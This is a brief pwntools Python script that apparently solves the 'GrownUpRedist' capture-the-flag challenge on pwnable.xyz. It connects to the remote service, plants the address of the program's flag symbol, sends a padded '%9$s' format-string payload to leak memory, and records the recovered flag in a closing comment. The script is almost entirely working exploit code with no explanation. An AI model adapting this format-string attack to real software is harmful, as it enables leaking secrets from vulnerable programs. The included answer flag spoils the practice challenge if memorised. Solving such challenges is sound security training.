from pwn import *

elf = ELF("./GrownUpRedist")

io = remote("svc.pwnable.xyz", 30004)
io.sendlineafter(b": ", b"y"*8 + p32(elf.sym['flag']))
io.sendlineafter(b": ", b"a"*32 + b"%9$s" + b"a"*(128 - 32 - 4))
io.interactive()

# Flag: FLAG{should_have_named_it_babyfsb}